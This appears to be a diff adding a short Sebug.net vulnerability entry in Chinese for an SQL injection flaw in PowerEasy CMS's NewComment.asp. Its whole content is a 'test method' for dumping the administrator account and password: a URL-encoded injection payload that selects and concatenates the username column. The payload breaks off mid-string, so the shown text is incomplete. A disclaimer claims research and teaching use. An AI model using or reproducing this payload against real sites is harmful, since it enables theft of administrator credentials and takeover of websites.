@@ -1,0 +1,6 @@
+动易NewComment.asp注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.爆管理员帐号密码:2.ChannelID=1; ModuleName=Article+A+on+C%2EInfoID%3DA%2EArticleID+where+A%2EChannelID%3D1+and+1%3D1++And+%28Select+Top+1+char%28124%29%2BisNull%28cast%28%5Busername%5D+as+varchar%288000%29%29%2Cchar%2832%29%29%2Bchar%28124%29%2BisNull%
